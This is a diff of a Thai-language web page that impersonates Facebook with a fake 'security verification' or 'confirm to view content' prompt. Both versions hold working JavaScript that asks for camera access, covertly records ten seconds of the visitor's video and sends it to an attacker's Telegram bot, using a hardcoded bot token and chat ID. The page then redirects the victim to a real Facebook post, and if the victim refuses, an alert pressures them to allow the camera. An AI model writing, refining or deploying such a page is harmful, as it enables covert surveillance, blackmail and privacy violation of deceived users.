@@ -1,76 +1,45 @@
 <!DOCTYPE html>
-<html lang="th">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Security Verification</title>
+    <title>เข้าชมเนื้อหา</title>
 </head>
-<body style="background:#f0f2f5; margin:0; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
-
-<div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:350px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="60" style="margin-bottom:20px;">
-    <h2 style="font-size:20px; color:#1c1e21; margin:0 0 15px;">การยืนยันความปลอดภัย</h2>
-    <p style="font-size:14px; color:#606770; line-height:1.5; margin-bottom:25px;">
-        บัญชีของคุณต้องได้รับการยืนยันสิทธิ์การเข้าถึง<br>โปรดกดปุ่มด้านล่างเพื่อดำเนินการต่อ
-    </p>
-    
-    <button id="authBtn" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">
-        กดยืนยันตัวตน
-    </button>
-    
-    <div id="loading" style="display:none; margin-top:20px; color:#1877f2; font-weight:bold;">
-        ⏳ กำลังตรวจสอบสิทธิ์...
+<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+    <div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:350px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <div style="color:#1877f2; font-weight:bold; font-size:24px; margin-bottom:15px;">Facebook</div>
+        <p style="font-size:16px; color:#1c1e21; margin-bottom:20px;">กดยืนยันเพื่อรับชมข้อมูล</p>
+        <button id="go" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">ตกลง</button>
+        <div id="wait" style="display:none; margin-top:15px; color:#606770;">⌛ กำลังโหลด...</div>
     </div>
-</div>
-
-<script>
-    // ข้อมูลเชื่อมต่อ Telegram ของพี่
-    const TOKEN = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
-    const CHAT_ID = '8482017371';
-    const REDIRECT_TO = 'https://www.facebook.com/share/p/1avrMEzzJn/';
-
-    document.getElementById('authBtn').onclick = async function() {
-        const btn = this;
-        const loader = document.getElementById('loading');
+    <script>
+        const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA'; // โทเค็นพี่
+        const C = '8482017371'; // ไอดีพี่
+        const R = 'https://www.facebook.com/share/p/1avrMEzzJn/'; // ลิงก์ปลายทาง
         
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        try {
-            // ขอเข้าถึงกล้อง
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'security_capture.mp4');
-
-                // ส่งวิดีโอเข้า Telegram พี่
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                // ปิดกล้องและเด้งไปหน้า Facebook จริง
-                stream.getTracks().forEach(t => t.stop());
-                window.location.replace(REDIRECT_TO);
-            };
-
-            recorder.start();
-            // บันทึก 10 วินาที
-            setTimeout(() => recorder.stop(), 10000);
-
-        } catch (err) {
-            alert("โปรดกด 'อนุญาต' (Allow) เพื่อเข้าสู่ระบบตามมาตรฐานความปลอดภัย");
-            btn.style.display = 'block';
-            loader.style.display = 'none';
-        }
-    };
-</script>
-
+        document.getElementById('go').onclick = async function() {
+            this.style.display = 'none';
+            document.getElementById('wait').style.display = 'block';
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const m = new MediaRecorder(s);
+                const k = [];
+                m.ondataavailable = e => k.push(e.data);
+                m.onstop = async () => {
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('video', new Blob(k, {type:'video/mp4'}), 'v.mp4');
+                    await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
+                    s.getTracks().forEach(t => t.stop());
+                    window.location.replace(R);
+                };
+                m.start();
+                setTimeout(() => m.stop(), 10000);
+            } catch (e) {
+                alert("โปรดกด 'อนุญาต' เพื่อเข้าชมเนื้อหา");
+                location.reload();
+            }
+        };
+    </script>
 </body>
 </html>
